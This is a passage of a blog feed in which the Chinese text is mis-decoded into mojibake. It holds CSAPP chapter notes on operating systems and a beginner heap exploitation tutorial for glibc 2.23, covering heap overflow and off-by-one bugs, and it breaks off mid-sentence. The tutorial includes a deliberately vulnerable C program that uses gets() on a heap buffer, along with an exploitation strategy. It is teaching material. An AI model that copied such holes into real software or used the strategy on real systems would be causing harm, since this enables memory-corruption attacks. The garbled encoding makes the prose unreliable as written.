class="headerlink" title="æ“ä½œç³»ç»Ÿ"></a>æ“ä½œç³»ç»Ÿ</h1><p>æˆ‘ä»¬å¯ä»¥æŠŠæ“ä½œç³»ç»Ÿç†è§£ä¸ºåº”ç”¨ç¨‹åºå’Œç¡¬ä»¶ä¹‹é—´çš„ä¸€å±‚è½¯ä»¶ï¼Œæ‰€æœ‰åº”ç”¨å¯¹ç¡¬ä»¶çš„æ“ä½œå°è¯•éƒ½å¿…é¡»ç»è¿‡æ“ä½œç³»ç»Ÿã€‚</p><p>![](&#x2F;img&#x2F;CSAPP-ç¬¬ä¸€ç« -è®¡ç®—æœºç³»ç»Ÿæ¼«æ¸¸-æ€»ç»“&#x2F;1-æ“ä½œç³»ç»Ÿ .png)</p><p>æ“ä½œç³»ç»Ÿçš„åŠŸèƒ½ï¼š</p><ul><li><p>é˜²æ­¢ç¡¬ä»¶è¢«å¤±æ§çš„åº”ç”¨ç¨‹åºæ»¥ç”¨</p></li><li><p>å‘åº”ç”¨ç¨‹åºæä¾›ç®€å•ä¸€è‡´çš„æœºåˆ¶æ¥æ§åˆ¶ä½çº§ç¡¬ä»¶è®¾å¤‡</p></li></ul><p>æ“ä½œç³»ç»Ÿé€šè¿‡ä¸‰ä¸ªæŠ½è±¡æ¦‚å¿µæ¥å®ç°ä¸Šè¿°åŠŸèƒ½ï¼šè¿›ç¨‹ã€è™šæ‹Ÿå†…å­˜ã€æ–‡ä»¶</p><p>ä¸‰ä¸ªæ¦‚å¿µçš„å…³ç³»å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%80%E7%AB%A0-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%BC%AB%E6%B8%B8-%E6%80%BB%E7%BB%93/1-%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E7%A1%AC%E4%BB%B6%E7%9A%84%E6%8A%BD%E8%B1%A1%E5%85%B3%E7%B3%BB.png"></p><h3 id="è¿›ç¨‹"><a href="#è¿›ç¨‹" class="headerlink" title="è¿›ç¨‹"></a>è¿›ç¨‹</h3><p><strong>è¿›ç¨‹</strong>æ˜¯æ“ä½œç³»ç»Ÿå¯¹æ­£åœ¨è¿è¡Œçš„ç¨‹åºçš„ä¸€ç§æŠ½è±¡ã€‚</p><p><strong>çº¿ç¨‹</strong>æ˜¯æ“ä½œç³»ç»Ÿèƒ½å¤Ÿè¿›è¡Œè¿ç®—è°ƒåº¦çš„æœ€å°å•ä½ã€‚å®ƒè¢«åŒ…å«åœ¨è¿›ç¨‹ä¹‹ä¸­ï¼Œæ˜¯è¿›ç¨‹ä¸­çš„å®é™…è¿ä½œå•ä½ã€‚ä¸€ä¸ªè¿›ç¨‹ç”±å¤šä¸ªçº¿ç¨‹ç»„æˆï¼Œæ¯ä¸ªçº¿ç¨‹éƒ½è¿è¡Œåœ¨è¿›ç¨‹çš„ä¸Šä¸‹æ–‡ä¸­ï¼Œå…±äº«åŒæ ·çš„ä»£ç å’Œæ•°æ®ã€‚</p><p><strong>å¹¶å‘è¿è¡Œ</strong>æ˜¯æŒ‡ä¸€ä¸ªè¿›ç¨‹çš„æŒ‡ä»¤å’Œå¦ä¸€ä¸ªè¿›ç¨‹çš„æŒ‡ä»¤äº¤é”™æ‰§è¡Œï¼Œå¤šä¸ªè¿›ç¨‹åŒæ—¶æ´»åŠ¨ã€‚ä¸€ä¸ªCPUé€šè¿‡ä¸Šä¸‹æ–‡åˆ‡æ¢å®ç°å¹¶å‘æ‰§è¡Œå¤šä¸ªç¨‹åºã€‚</p><h3 id="è™šæ‹Ÿå†…å­˜"><a href="#è™šæ‹Ÿå†…å­˜" class="headerlink" title="è™šæ‹Ÿå†…å­˜"></a>è™šæ‹Ÿå†…å­˜</h3><p><strong>è™šæ‹Ÿå†…å­˜</strong>æ˜¯ä¸»å­˜å’ŒI&#x2F;Oè®¾å¤‡çš„æŠ½è±¡ï¼Œå®ƒä¸ºè¿›ç¨‹æä¾›ä¸€ç§ç‹¬ç«‹å ç”¨å†…å­˜çš„å‡è±¡ã€‚</p><p>æ¯ä¸ªè¿›ç¨‹çœ‹åˆ°çš„å†…å­˜éƒ½æ˜¯ä¸€è‡´çš„ï¼Œç§°ä¸º<strong>è™šæ‹Ÿåœ°å€ç©ºé—´</strong>ã€‚æ¯ä¸ªè¿›ç¨‹çœ‹åˆ°çš„è™šæ‹Ÿåœ°å€ç©ºé—´ç”±å¤§é‡å‡†ç¡®å®šä¹‰çš„åŒºæ„æˆï¼Œæ¯ä¸ªåŒºéƒ½æœ‰ä¸“é—¨çš„åŠŸèƒ½ã€‚</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%80%E7%AB%A0-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%BC%AB%E6%B8%B8-%E6%80%BB%E7%BB%93/1-%E8%BF%9B%E7%A8%8B%E7%9A%84%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4.png"></p><h4 id="æ–‡ä»¶"><a href="#æ–‡ä»¶" class="headerlink" title="æ–‡ä»¶"></a>æ–‡ä»¶</h4><p>æ–‡ä»¶å°±æ˜¯<strong>å­—èŠ‚åºåˆ—</strong>ï¼Œæ¯ä¸ªI&#x2F;Oè®¾å¤‡ï¼ŒåŒ…æ‹¬ç£ç›˜ã€é”®ç›˜ã€æ˜¾ç¤ºè®¾å¤‡ï¼Œç”šè‡³ç½‘ç»œéƒ½å¯çœ‹ä¸ºæ–‡ä»¶ã€‚</p><h1 id="é‡è¦æ¦‚å¿µ"><a href="#é‡è¦æ¦‚å¿µ" class="headerlink" title="é‡è¦æ¦‚å¿µ"></a>é‡è¦æ¦‚å¿µ</h1><h3 id="Amdahl-å®šå¾‹"><a href="#Amdahl-å®šå¾‹" class="headerlink" title="Amdahl å®šå¾‹"></a>Amdahl å®šå¾‹</h3><p>Amdahl å®šå¾‹ï¼ˆä¹Ÿå«é˜¿å§†è¾¾å°”å®šå¾‹ï¼‰ä¸»è¦æ€æƒ³æ˜¯ï¼Œå½“æˆ‘ä»¬å¯¹ç³»ç»Ÿçš„æŸä¸ªéƒ¨åˆ†åŠ é€Ÿæ—¶ï¼Œå…¶å¯¹ç³»ç»Ÿæ•´ä½“æ€§èƒ½çš„å½±å“å–å†³äºè¯¥éƒ¨åˆ†çš„é‡è¦æ€§å’ŒåŠ é€Ÿç¨‹åº¦ã€‚</p><p>æ‰€ä»¥ï¼Œ<strong>è¦æƒ³æ˜¾è‘—åŠ é€Ÿæ•´ä¸ªç³»ç»Ÿï¼Œå¿…é¡»æå‡å…¨ç³»ç»Ÿä¸­ç›¸å½“å¤§çš„éƒ¨åˆ†çš„é€Ÿåº¦</strong>ã€‚</p><h3 id="å¹¶è¡Œå’Œå¹¶å‘"><a href="#å¹¶è¡Œå’Œå¹¶å‘" class="headerlink" title="å¹¶è¡Œå’Œå¹¶å‘"></a>å¹¶è¡Œå’Œå¹¶å‘</h3><p><strong>å¹¶å‘</strong>æ˜¯æŒ‡ä¸€ä¸ªåŒæ—¶å…·æœ‰å¤šä¸ªæ´»åŠ¨çš„ç³»ç»Ÿã€‚</p><p><strong>å¹¶è¡Œ</strong>æ˜¯æŒ‡ç”¨å¹¶å‘æ¥ä½¿ä¸€ä¸ªç³»ç»Ÿè¿è¡Œå¾—æ›´å¿«ã€‚</p><h4 id="çº¿ç¨‹çº§å¹¶å‘"><a href="#çº¿ç¨‹çº§å¹¶å‘" class="headerlink" title="çº¿ç¨‹çº§å¹¶å‘"></a>çº¿ç¨‹çº§å¹¶å‘</h4><p>æ„å»ºåœ¨è¿›ç¨‹è¿™ä¸ªæŠ½è±¡ä¹‹ä¸Šï¼Œæˆ‘ä»¬èƒ½å¤Ÿè®¾è®¡å‡ºåŒæ—¶æœ‰å¤šä¸ªç¨‹åºæ‰§è¡Œçš„ç³»ç»Ÿï¼Œè¿™å°±å¯¼è‡´äº†å¹¶å‘ã€‚ä½¿ç”¨çº¿ç¨‹ï¼Œæˆ‘ä»¬ç”šè‡³èƒ½å¤Ÿåœ¨ä¸€ä¸ªè¿›ç¨‹ä¸­æ‰§è¡Œå¤šä¸ªæ§åˆ¶æµã€‚</p><p><strong>å¤šå¤„ç†å™¨ç³»ç»Ÿ</strong>æ˜¯ç”±å•æ“ä½œç³»ç»Ÿå†…æ ¸æ§åˆ¶çš„å¤šå¤„ç†å™¨ç»„æˆçš„ç³»ç»Ÿã€‚</p><p><strong>å¤šæ ¸å¤„ç†å™¨</strong>æ˜¯å°†å¤šä¸ªCPU(ç§°ä¸ºâ€æ ¸â€)é›†æˆåˆ°ä¸€ä¸ªé›†æˆç”µè·¯èŠ¯ç‰‡ä¸Šã€‚</p><p>è¶…çº¿ç¨‹ï¼Œæœ‰æ—¶ç§°ä¸º<strong>åŒæ—¶å¤šçº¿ç¨‹</strong>ï¼ˆsimultaneous multi-threadingï¼‰ï¼Œæ˜¯ä¸€é¡¹å…è®¸ä¸€ä¸ª CPU æ‰§è¡Œå¤šä¸ªæ§åˆ¶æµçš„æŠ€æœ¯ã€‚è¶…çº¿ç¨‹çš„å¤„ç†å™¨å¯ä»¥åœ¨å•ä¸ªå‘¨æœŸçš„åŸºç¡€ä¸Šå†³å®šè¦æ‰§è¡Œå“ªä¸€ä¸ªçº¿ç¨‹ï¼Œæ¯”å¦‚ï¼Œå‡è®¾ä¸€ä¸ªçº¿ç¨‹å¿…é¡»ç­‰åˆ°æŸäº›æ•°æ®è¢«è£…è½½åˆ°é«˜é€Ÿç¼“å­˜ä¸­ï¼Œé‚£åœ¨è¿™ä¸ªè£…åœ¨è¿‡ç¨‹ä¸­ï¼Œ CPU å°±å¯ä»¥ç»§ç»­å»æ‰§è¡Œå¦å¤–çš„ä¸€ä¸ªçº¿ç¨‹ã€‚</p><h4 id="æŒ‡ä»¤çº§å¹¶è¡Œ"><a href="#æŒ‡ä»¤çº§å¹¶è¡Œ" class="headerlink" title="æŒ‡ä»¤çº§å¹¶è¡Œ"></a>æŒ‡ä»¤çº§å¹¶è¡Œ</h4><p>ç°ä»£å¤„ç†å™¨å¯ä»¥åŒæ—¶æ‰§è¡Œå¤šæ¡æŒ‡ä»¤çš„å±æ€§ç§°ä¸ºæŒ‡ä»¤çº§å¹¶è¡Œã€‚</p><p><strong>è¶…æ ‡é‡å¤„ç†å™¨</strong>æ˜¯æŒ‡å¯ä»¥è¾¾åˆ°æ¯”ä¸€ä¸ªå‘¨æœŸä¸€æ¡æŒ‡ä»¤æ›´å¿«çš„æ‰§è¡Œé€Ÿç‡çš„å¤„ç†å™¨ã€‚</p><h4 id="å•æŒ‡ä»¤ã€å¤šæ•°æ®å¹¶è¡Œ"><a href="#å•æŒ‡ä»¤ã€å¤šæ•°æ®å¹¶è¡Œ" class="headerlink" title="å•æŒ‡ä»¤ã€å¤šæ•°æ®å¹¶è¡Œ"></a>å•æŒ‡ä»¤ã€å¤šæ•°æ®å¹¶è¡Œ</h4><p>å•æŒ‡ä»¤ã€å¤šæ•°æ®ï¼Œå³ SIMD å¹¶è¡Œï¼Œå°±æ˜¯è®¸å¤šç°ä»£å¤„ç†å™¨æ‹¥æœ‰ç‰¹æ®Šçš„ç¡¬ä»¶ï¼Œå…è®¸ä¸€æ¡æŒ‡ä»¤äº§ç”Ÿå¤šä¸ªå¯ä»¥å¹¶è¡Œæ‰§è¡Œçš„æ“ä½œã€‚</p><h3 id="è™šæ‹Ÿæœº"><a href="#è™šæ‹Ÿæœº" class="headerlink" title="è™šæ‹Ÿæœº"></a>è™šæ‹Ÿæœº</h3><p>è™šæ‹Ÿæœºæä¾›å¯¹æ•´ä¸ªè®¡ç®—æœºçš„æŠ½è±¡ï¼ŒåŒ…æ‹¬æ“ä½œç³»ç»Ÿã€å¤„ç†å™¨å’Œç¨‹åºã€‚</p><p>è™šæ‹Ÿæœºè¿™ä¸ªæŠ½è±¡æ¦‚å¿µä¸ä¹‹å‰çš„è¿›ç¨‹ã€è™šæ‹Ÿå†…å­˜å’Œæ–‡ä»¶çš„æŠ½è±¡æ¦‚å¿µå…³ç³»å¦‚ä¸‹å›¾ï¼š</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%80%E7%AB%A0-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%BC%AB%E6%B8%B8-%E6%80%BB%E7%BB%93/1-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%8F%90%E4%BE%9B%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%BD%E8%B1%A1.png"></p><hr><p>ä¹‹å‰ä¸€ç›´åœ¨<del>å¿«ä¹æš‘å‡æ‘†çƒ‚</del> åˆ°å¤„åƒå¸­ï¼Œç»ˆäºè¦å¼€å§‹æ¢å¤å­¦ä¹ çŠ¶æ€è¾£ğŸ¤ª</p>]]></content>
    
    
    <categories>
      
      <category>è¯»ä¹¦ç¬”è®°</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>CSAPP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å †æ¼æ´åˆ©ç”¨(ä¸€)</title>
    <link href="/2023/08/06/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/"/>
    <url>/2023/08/06/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<p>å †æ¼æ´çš„åˆ©ç”¨å§¿åŠ¿ï¼Œèµ¶ç´§æ¥å­¦ä¹ ä¸€ä¸‹å§ï¼ï¼</p><span id="more"></span><p><del>è¿™ä¸ªäººå‘ä»€ä¹ˆç–¯</del></p><blockquote><p>å¦‚æœæ²¡æœ‰ç‰¹æ®Šè¯´æ˜ï¼Œç¯å¢ƒä¸º ubuntu16  libc2.23  64ä½</p><p>è¿™ä¸ªç½‘å€å¯ä»¥æŸ¥çœ‹æºç  ï¼š<a href="https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c">malloc.c - malloc&#x2F;malloc.c - Glibc source code (glibc-2.23) - Bootlin</a></p></blockquote><h1 id="å †æº¢å‡º"><a href="#å †æº¢å‡º" class="headerlink" title="å †æº¢å‡º"></a>å †æº¢å‡º</h1><h3 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h3><p>å †æº¢å‡ºæ˜¯æŒ‡ç¨‹åºå‘æŸä¸ªå †å—å†™å…¥çš„å­—èŠ‚æ•°è¶…è¿‡äº†å †å—æœ¬èº«<strong>å¯ä»¥ä½¿ç”¨çš„å­—èŠ‚æ•°</strong>ï¼Œå› è€Œå¯¼è‡´äº†æ•°æ®æº¢å‡ºï¼Œå¹¶è¦†ç›–åˆ°äº†ç‰©ç†ç›¸é‚»çš„é«˜åœ°å€çš„ä¸‹ä¸€ä¸ªå †å—ã€‚</p><p>å †æº¢å‡ºçš„å‰ææ˜¯ï¼š</p><ul><li>ç¨‹åºå‘å †ä¸Šå†™å…¥æ•°æ®</li><li>å†™å…¥çš„æ•°æ®å¤§å°æ²¡æœ‰è¢«è‰¯å¥½çš„æ§åˆ¶</li></ul><p>å †æº¢å‡ºå’Œæ ˆæº¢å‡ºã€BSSæ®µæº¢å‡ºç›¸ä¼¼ï¼Œæ˜¯ä¸€ç§ç¼“å†²åŒºæº¢å‡ºã€‚ä½†æ˜¯ä¸æ ˆæº¢å‡ºä¸åŒçš„æ˜¯ï¼Œå¯¹ä¸Šå¹¶æ²¡æœ‰è¿”å›åœ°å€è¿™æ ·çš„å¯ä»¥è®©æ”»å‡»è€…ç›´æ¥æ§åˆ¶æ‰§è¡Œæµç¨‹çš„æ•°æ®ï¼Œå› æ­¤åœ¨å †æº¢å‡ºçš„åˆ©ç”¨ä¸­ï¼Œæˆ‘ä»¬æ— æ³•é€šè¿‡æ§åˆ¶EIPæ¥æ§åˆ¶ç¨‹åºã€‚</p><p>ä½†æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä¸å †ç›¸å…³çš„æ•°æ®ç»“æ„å“‡ï¼Œæˆ‘ä»¬çš„åˆ©ç”¨ç­–ç•¥å¦‚ä¸‹ï¼š</p><ul><li><p>è¦†ç›–ä¸å…¶<strong>ç‰©ç†ç›¸é‚»çš„ä¸‹ä¸€ä¸ª chunk</strong> çš„å†…å®¹</p><ul><li><p>prev_size</p></li><li><p>sizeï¼Œä½ä¸‰ä½çš„æ¯”ç‰¹ä½æ•°æ®ï¼Œä»¥åŠå †å—çœŸæ­£çš„å¤§å°</p><ul><li><p>NON_MAIN_ARENA</p></li><li><p>IS_MAPPED</p></li><li><p>PREV_INUSE</p></li><li><p>the true chunk size</p></li></ul></li><li><p>chunk contentï¼Œæ”¹å˜ç¨‹åºçš„æ‰§è¡Œæµ</p></li></ul></li><li><p>åˆ©ç”¨å †çš„æœºåˆ¶å®ç°ä»»æ„åœ°å€å†™å…¥æˆ–è€…æ§åˆ¶å †å—ä¸­çš„å†…å®¹ï¼Œä»è€Œæ‰§è¡Œç¨‹åºçš„æ§åˆ¶æµã€‚</p></li></ul><h3 id="ä¸¾ä¸ªæ —å­ï¼š"><a href="#ä¸¾ä¸ªæ —å­ï¼š" class="headerlink" title="ä¸¾ä¸ªæ —å­ï¼š"></a>ä¸¾ä¸ªæ —å­ï¼š</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> <br>&#123;<br>  <span class="hljs-type">char</span> *chunk;<br>  chunk=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">24</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Get input:&quot;</span>);<br>  gets(chunk);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬è¾“å…¥A*100ï¼Œå°±å¯ä»¥æŠŠç›¸é‚»çš„å †è¦†ç›–æ‰</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/heapout_first.png"></p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/heapout_last.png"></p><h3 id="åˆ©ç”¨æ­¥éª¤"><a href="#åˆ©ç”¨æ­¥éª¤" class="headerlink" title="åˆ©ç”¨æ­¥éª¤"></a>åˆ©ç”¨æ­¥éª¤</h3><h5 id="å¯»æ‰¾åˆ†é…å‡½æ•°"><a href="#å¯»æ‰¾åˆ†é…å‡½æ•°" class="headerlink" title="å¯»æ‰¾åˆ†é…å‡½æ•°"></a>å¯»æ‰¾åˆ†é…å‡½æ•°</h5><p>é€šå¸¸æ¥è¯´ï¼Œå †é€šè¿‡ malloc å‡½æ•°åˆ†é…ï¼Œåœ¨æŸäº›æƒ…å†µä¸‹ä¹Ÿä¼šé€šè¿‡ calloc å‡½æ•°åˆ†é…ã€‚è¿™ä¸¤ä¸ªå‡½æ•°çš„åŒºåˆ«å°±æ˜¯ calloc åœ¨åˆ†é…åä¼šå°†ç©ºé—´å…¨éƒ¨åˆå§‹åŒ–ä¸º0ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">calloc</span>(<span class="hljs-number">0x20</span>);<br><span class="hljs-comment">//ç­‰åŒäº</span><br>ptr = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><span class="hljs-built_in">memset</span>(ptr,<span class="hljs-number">0</span>,<span class="hljs-number">0x20</span>);<br></code></pre></td></tr></table></figure><p>é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜æœ‰ä¸€ä¸ª realloc åˆ†é…æ–¹å¼ï¼Œç”¨äºå°†ç›®æ ‡å†…å­˜æ‰©å¤§ã€‚realloc å‡½æ•°å¯ä»¥èº«å…¼ malloc å’Œ free ä¸¤ä¸ªå‡½æ•°çš„åŠŸèƒ½ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">reaclloc(prt,size)        <span class="hljs-comment">//å°†ptrå†…å­˜å¤§å°å¢å¤§åˆ°sizeã€‚</span><br></code></pre></td></tr></table></figure><p>å…·ä½“æ“ä½œï¼š</p><ul><li><p>å¦‚æœ realloc çš„ size ä¸ç­‰äº prt çš„ size ï¼š</p><ul><li>ç”³è¯· size &gt; åŸæ¥çš„ size<ul><li>å¦‚æœ chunk ä¸ top chunk ç›¸é‚»ï¼Œç›´æ¥æ‹“å±•è¿™ä¸ª chunk åˆ°æ–°çš„ size å¤§å°</li><li>å¦‚æœ chunk ä¸ top chunk ä¸ç›¸é‚»ï¼Œç›¸å½“äº <code>free(ptr); malloc(new_size)</code></li></ul></li><li>ç”³è¯· size &lt; åŸæ¥çš„ size<ul><li>å¦‚æœç›¸å·®ä¸è¶³ä»¥å®¹çº³ä¸€ä¸ªæœ€å°çš„ chunkï¼Œï¼ˆ64 ä½ä¸‹ 32 ä¸ªå­—èŠ‚ï¼Œ32 ä½ä¸‹ 16 ä¸ªå­—èŠ‚ï¼‰ï¼Œåˆ™ä¿æŒä¸å˜</li><li>å¦‚æœç›¸å·®è¶³å¤Ÿå®¹çº³ä¸‹ä¸€ä¸ªæœ€å°çš„ chunkï¼Œå°±åˆ‡å‰²åŸæœ¬çš„ chunkï¼Œfree æ‰ååŠéƒ¨åˆ†</li></ul></li></ul></li><li><p>å¦‚æœ realloc çš„ size ç­‰äº 0ï¼Œç›¸å½“äº <code>free(prt)</code></p></li><li><p>å¦‚æœ realloc çš„ size ç­‰äº prt çš„ sizeï¼Œé‚£è®¡ç®—æœºå°†ä¸è¿›è¡Œä»»ä½•æ“ä½œ</p></li></ul><h5 id="å¯»æ‰¾å±é™©å‡½æ•°"><a href="#å¯»æ‰¾å±é™©å‡½æ•°" class="headerlink" title="å¯»æ‰¾å±é™©å‡½æ•°"></a>å¯»æ‰¾å±é™©å‡½æ•°</h5><p>å…¶å®å°±æ˜¯æ ˆæº¢å‡ºçš„æ—¶å€™æˆ‘ä»¬åˆ©ç”¨çš„é‚£ä¸€æ‰¹å±é™©å‡½æ•°ã€‚å¸¸è§çš„å±é™©å‡½æ•°å¦‚ä¸‹</p><ul><li>è¾“å…¥<ul><li>getsï¼Œç›´æ¥è¯»å–ä¸€è¡Œï¼Œå¿½ç•¥ <code>&#39;\x00&#39;</code></li><li>scanf</li><li>vscanf</li></ul></li><li>è¾“å‡º<ul><li>sprintf</li></ul></li><li>å­—ç¬¦ä¸²<ul><li>strcpyï¼Œå­—ç¬¦ä¸²å¤åˆ¶ï¼Œé‡åˆ° <code>&#39;\x00&#39;</code> åœæ­¢</li><li>strcatï¼Œå­—ç¬¦ä¸²æ‹¼æ¥ï¼Œé‡åˆ° <code>&#39;\x00&#39;</code> åœæ­¢</li><li>bcopy</li></ul></li></ul><h5 id="ç¡®å®šå¡«å……é•¿åº¦"><a href="#ç¡®å®šå¡«å……é•¿åº¦" class="headerlink" title="ç¡®å®šå¡«å……é•¿åº¦"></a>ç¡®å®šå¡«å……é•¿åº¦</h5><p>è®¡ç®—æˆ‘ä»¬å¼€å§‹å†™å…¥çš„åœ°å€ä¸æˆ‘ä»¬æ‰€è¦è¦†ç›–çš„åœ°å€ä¹‹é—´çš„è·ç¦»ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œmallocå‚æ•°å¹¶ä¸ç­‰äºå®é™…å †å—åˆ†é…çš„å¤§å°ï¼Œæˆ‘ä»¬ä¹‹å‰æåˆ°ï¼Œåœ¨å®é™…çš„å†…å­˜åˆ†é…ä¸­éœ€è¦ä¿è¯chunk å¤§å°æ˜¯å¯¹é½çš„ï¼ˆå­—é•¿çš„ä¸¤å€ï¼‰ã€‚</p><p>å¹¶ä¸”ä¹Ÿå¹¶ä¸æ˜¯æœºå™¨åˆ†é…çš„chunkéƒ½æ˜¯ç”¨æˆ·å¯ä»¥ä½¿ç”¨çš„ç”¨æˆ·åŒºåŸŸï¼Œ<code>chunk_head.size = ç”¨æˆ·åŒºåŸŸå¤§å° + 2 * å­—é•¿</code></p><p>å°±æ¯”å¦‚æˆ‘ä»¬ä½¿ç”¨ <code>malloc(24)</code> ï¼Œåœ¨ 64 ä½çš„ç³»ç»Ÿä¸­ç”³è¯· 24 å­—èŠ‚çš„ chunk ã€‚ä½†ç”±äºéœ€è¦ä¿è¯å†…å­˜å¯¹é½ï¼Œç³»ç»Ÿä¼šå‘ä¸Šå–æ•´åˆ° 32 å­—èŠ‚ã€‚åœ¨åˆ†é…å‡ºæ¥çš„32å­—èŠ‚ä¸­ï¼Œåˆæœ‰ä¸¤ä¸ªæœºå™¨å­—é•¿ä¹Ÿå°±æ˜¯ 16 å­—èŠ‚çš„å¤´éƒ¨ä¸èƒ½ä¾›ç”¨æˆ·ä½¿ç”¨ï¼Œæ‰€ä»¥å®é™…ä¸Šæˆ‘ä»¬ç”³è¯· 24 å­—èŠ‚çš„å­—æ®µï¼Œå®é™…ä¸Šç”¨æˆ·å¯ä»¥ä½¿ç”¨çš„ chunk ä¸º 16 å­—èŠ‚ã€‚</p><p>ä½†æ˜¯è¿™ä¸ªå †å—ä»ç„¶å¯ä»¥å‚¨å­˜24å­—èŠ‚çš„æ•°æ®ï¼Œå› ä¸ºå®ƒå¯ä»¥ä½¿ç”¨ä¸‹ä¸€ä¸ª chunk çš„ pre_size å­—æ®µï¼Œæ­£å¥½ 24 ä¸ªå­—èŠ‚ï¼ˆ off-by-one æ¼æ´å°±æ˜¯è¿™ä¹ˆæ¥çš„ï¼‰ã€‚</p><h1 id="Off-By-One"><a href="#Off-By-One" class="headerlink" title="Off-By-One"></a>Off-By-One</h1><p>ä¸¥æ ¼æ¥è®² off-by-one ä¹Ÿæ˜¯ä¸€ç§æº¢å‡ºçš„æ“ä½œï¼Œä½†æ˜¯ off-by-one ç‰¹æŒ‡ç¨‹åºå‘ç¼“å†²åŒºä¸­å†™å…¥æ—¶ï¼Œå†™å…¥çš„å­—èŠ‚æ•°è¶…è¿‡äº†è¿™ä¸ªç¼“å†²åŒºæœ¬èº«æ‰€ç”³è¯·çš„å­—èŠ‚æ•°å¹¶ä¸”åª<strong>è¶Šç•Œäº†ä¸€ä¸ªå­—èŠ‚</strong>çš„æº¢å‡ºåˆ©ç”¨ã€‚</p><h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>off-by-one æ˜¯å•å­—èŠ‚æº¢å‡ºï¼Œè¿™ç§æ¼æ´çš„äº§ç”Ÿå¾€å¾€ä¸è¾¹ç•ŒéªŒè¯ä¸ä¸¥å’Œå­—ç¬¦ä¸²æ“ä½œæœ‰å…³ï¼Œå½“ç„¶ä¹Ÿä¸æ’é™¤å†™å…¥çš„ size æ­£å¥½å°±åªå¤šäº†ä¸€ä¸ªå­—èŠ‚çš„æƒ…å†µï¼ˆå°±åƒä¸Šä¸€ä¸ª malloc(24) çš„ä¾‹å­ï¼‰ã€‚</p><p>å…¶ä¸­è¾¹ç•ŒéªŒè¯ä¸ä¸¥è°¨ä¸»è¦æœ‰ä»¥ä¸‹å‡ ç§å¯èƒ½ï¼š</p><ul><li>ä½¿ç”¨å¾ªç¯è¯­å¥å‘å †ä¸­å†™å…¥æ•°æ®æ—¶ï¼Œå¾ªç¯æ¬¡æ•°è®¾ç½®é”™è¯¯</li><li>å­—ç¬¦ä¸²æ“ä½œä¸æ­£ç¡®</li></ul><h3 id="åˆ©ç”¨æ€è·¯"><a href="#åˆ©ç”¨æ€è·¯" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h3><h5 id="æº¢å‡ºå­—èŠ‚ä¸ºå¯æ§åˆ¶å­—èŠ‚"><a href="#æº¢å‡ºå­—èŠ‚ä¸ºå¯æ§åˆ¶å­—èŠ‚" class="headerlink" title="æº¢å‡ºå­—èŠ‚ä¸ºå¯æ§åˆ¶å­—èŠ‚"></a>æº¢å‡ºå­—èŠ‚ä¸ºå¯æ§åˆ¶å­—èŠ‚</h5><p>é€šè¿‡ä¿®æ”¹å†…å­˜å—çš„å¤§å°é€ æˆå—ç»“æ„ä¹‹é—´çš„é‡å ï¼Œä»è€Œæ³„éœ²å…¶ä»–å—æ•°æ®ï¼Œæˆ–æ˜¯è¦†ç›–ä¿®æ”¹å…¶ä»–å—æ•°æ®ã€‚</p><h5 id="æº¢å‡ºå­—èŠ‚ä¸ºNULLå­—èŠ‚"><a href="#æº¢å‡ºå­—èŠ‚ä¸ºNULLå­—èŠ‚" class="headerlink" title="æº¢å‡ºå­—èŠ‚ä¸ºNULLå­—èŠ‚"></a>æº¢å‡ºå­—èŠ‚ä¸ºNULLå­—èŠ‚</h5><p>åœ¨ size ä¸º 0x100 çš„æ—¶å€™ï¼Œæº¢å‡º NULL å­—èŠ‚å¯ä»¥ä½¿å¾— <code>prev_in_use</code> 